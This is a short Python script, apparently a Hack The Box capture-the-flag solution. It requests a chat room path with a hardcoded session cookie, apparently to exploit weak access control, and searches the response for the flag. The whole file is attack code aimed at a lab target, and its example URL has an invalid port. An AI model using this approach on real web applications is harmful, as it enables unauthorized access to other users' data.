import sys
import requests
import re

def read_flag(url):
    path = "/chat/?rid=3"
    cookies = {
        "session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjozNTIsInVzZXJuYW1lIjoidXNlcjIwNjYifX0.mFSfPAFmLzd2MadKuMkQz" ###### CHANGE COOKIE ######
    }

    try:
        response = requests.get(url + path, cookies=cookies, verify=False)
        print(f"[*] HTTP Response Code: {response.status_code}")

        if response.status_code == 200:
            match = re.findall(r"HTB\{.*?\}", response.text)
            if match:
                print(f"[+] FLAG FOUND: {match[0]}")
            else:
                print("[-] No HTB flag found in response.")
        else:
            print("[-] Request failed, check the URL or session.")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        print("Example: python script.py http://10.10.10.50:80809")
        sys.exit(-1)

    url = sys.argv[1].rstrip('/')
    print("[*] Running exploit script...")
    read_flag(url)

if __name__ == "__main__":
    main()
